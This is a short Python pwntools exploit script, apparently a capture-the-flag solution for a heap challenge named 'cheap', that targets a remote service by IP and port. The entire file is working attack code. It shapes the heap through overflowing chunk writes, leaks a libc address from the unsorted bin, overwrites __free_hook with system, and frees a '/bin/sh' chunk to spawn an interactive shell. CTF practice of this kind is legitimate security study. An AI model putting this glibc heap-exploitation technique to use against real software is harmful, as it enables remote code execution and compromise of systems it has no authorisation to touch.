from pwn import *

#s = process('./cheap')
#raw_input('DEBUG')

s = remote('34.146.101.4', 30001)

unsorted_bin = 0x1ebbe0
system_offset = 0x55410
free_hook_offset = 0x1eeb28

def create(size, data):
	s.sendlineafter(b'Choice: ', b'1')
	s.sendlineafter(b'size: ', bytes(str(size), 'utf-8'))
	s.sendafter(b'data: ', data)

def delete():
	s.sendlineafter(b'Choice: ', b'3')

def show():
	s.sendlineafter(b'Choice: ', b'2')


# Part 2: overwrite free_hook and get shell

create(0x40, b'\n')
delete()

create(0x50, b'\n')
delete()

create(0x20, b'\n')
delete()

create(0x10, b'\n')
delete()

create(0x30, b'\n')

payload = b'A' * 0x50 + p64(0) + p64(0x51) + b'\n'
create(0x50, payload)
delete()

create(0x20, b'\n')
delete()

#Part 1: leak libc
create(0xf0, b'\n')
delete()

create(0x70, b'\n')
delete()

create(0x3a0, b'\n')
delete()

create(0x90, b'\n')

payload = b'A' * 0xf0 + p64(0) + p64(0x431) + b'\n'
create(0xf0, payload)
delete()

create(0x70, b'\n')
delete()

create(0xf0, b'A' * 0x100)
show()

s.recvuntil(b'A' * 0x100)

unsorted_bin_leak = int.from_bytes(s.recvline().strip(), byteorder = 'little', signed = False)

libc_base = unsorted_bin_leak - unsorted_bin
system = libc_base + system_offset
free_hook = libc_base + free_hook_offset

# Part 2 continue

payload = b'A' * 0x60 + p64(free_hook) + b'\n'
create(0x50, payload)
delete()

create(0x40, b'\n')

create(0x40, p64(system) + b'\n')

create(0x10, b'/bin/sh\n')
delete()

s.interactive()
